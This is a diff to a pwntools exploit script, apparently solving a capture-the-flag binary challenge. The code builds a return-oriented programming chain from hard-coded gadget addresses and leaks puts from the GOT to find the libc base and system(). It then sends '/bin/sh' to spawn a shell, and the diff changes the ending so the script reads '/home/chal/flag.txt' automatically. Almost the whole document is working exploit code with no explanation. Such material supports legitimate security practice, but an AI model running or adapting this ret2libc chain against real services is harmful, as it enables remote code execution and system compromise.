@@ -1,8 +1,9 @@
 from pwn import *
+import time
 
-context.terminal = ["tmux", "splitw", "-h"]
+
 context.arch = "amd64"
-
+context.terminal = ["tmux", "splitw", "-h"]
 
 # 0x0000000000401263 : pop rdi ; ret
 # 0x0000000000401261 : pop rsi ; pop r15 ; ret
@@ -32,7 +33,6 @@ def main():
             bss,  # bss
             0x0000000000401090,  # gets@plt
             0x0000000000401263,  # pop rdi ; ret
-            # 0x0000000000401070,  # puts@plt
             0x403368,  # puts@got
             0x0000000000401090,  # gets@plt
             0x0000000000401263,  # pop rdi ; ret
@@ -45,7 +45,7 @@ def main():
     assert r.recvline() == b"boom !\n"
     put_got = u64(r.recvline().strip().ljust(8, b"\x00"))
     log.info(f"puts@got: {hex(put_got)}")
-    glibc = ELF("./libc.so.6")
+    glibc = ELF("./libc.so.6", checksec=False)
     # glibc = ELF("/usr/lib/libc.so.6")
     log.info(f"puts@libc: {hex(glibc.symbols['puts'])}")
     libc_base = put_got - glibc.symbols["puts"]
@@ -54,7 +54,9 @@ def main():
     log.info(f"system: {hex(system)}")
     r.sendline(b"/bin/sh\x00")
     r.sendline(flat([system]))
-    r.interactive()
+    time.sleep(0.1)
+    r.sendline(b"cat /home/chal/flag.txt")
+    print(r.recv().decode().strip())
 
 
 if __name__ == "__main__":
